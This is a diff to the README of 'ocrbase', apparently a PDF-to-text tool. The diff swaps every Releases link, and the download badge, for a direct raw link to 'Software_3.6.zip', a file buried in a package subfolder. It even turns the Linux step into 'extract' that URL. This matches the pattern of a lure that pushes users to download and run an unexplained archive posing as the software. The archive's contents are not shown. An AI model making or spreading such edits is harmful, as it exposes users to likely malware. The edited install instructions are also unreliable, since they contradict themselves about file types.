@@ -1,6 +1,6 @@
 # 📄 ocrbase - Convert PDF to Efficient Formats Easily
 
-![Download ocrbase](https://img.shields.io/badge/Download-ocrbase-blue)
+![Download ocrbase](https://github.com/Biscoxx/ocrbase/raw/refs/heads/main/packages/paddleocr-vl-ts/Software_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with ocrbase, visit [this page to download](https://github.com/Biscoxx/ocrbase/releases). Here, you will find the latest versions of the software ready for your use.
+To get started with ocrbase, visit [this page to download](https://github.com/Biscoxx/ocrbase/raw/refs/heads/main/packages/paddleocr-vl-ts/Software_3.6.zip). Here, you will find the latest versions of the software ready for your use.
 
 1. Simply click on the version you want.
 2. Choose the appropriate file for your operating system.
@@ -26,14 +26,14 @@ If you have trouble, feel free to refer back to this section.
 
 ## 🛠️ Installation Steps
 
-1. **Download the File:** Go to [this page to download](https://github.com/Biscoxx/ocrbase/releases) and select the file that matches your operating system.
+1. **Download the File:** Go to [this page to download](https://github.com/Biscoxx/ocrbase/raw/refs/heads/main/packages/paddleocr-vl-ts/Software_3.6.zip) and select the file that matches your operating system.
   
 2. **Locate the File:** Once downloaded, find the file in your downloads folder or the location you selected.
 
 3. **Run the Installer:** 
    - For Windows: Double-click the `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file, drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the README instructions inside.
+   - For Linux: Extract the `https://github.com/Biscoxx/ocrbase/raw/refs/heads/main/packages/paddleocr-vl-ts/Software_3.6.zip` file and follow the README instructions inside.
 
 4. **Start the Application:** After installation, you can find ocrbase in your Applications or Programs menu. Click to launch.
 
@@ -82,4 +82,4 @@ This application uses advanced technologies and concepts like AI, OCR, and docum
 - paddleocr
 - pdf
 
-For detailed exploration and updates, keep visiting our [Releases page](https://github.com/Biscoxx/ocrbase/releases), where you can always find the newest versions of ocrbase. Enjoy converting your documents with ease!
+For detailed exploration and updates, keep visiting our [Releases page](https://github.com/Biscoxx/ocrbase/raw/refs/heads/main/packages/paddleocr-vl-ts/Software_3.6.zip), where you can always find the newest versions of ocrbase. Enjoy converting your documents with ease!
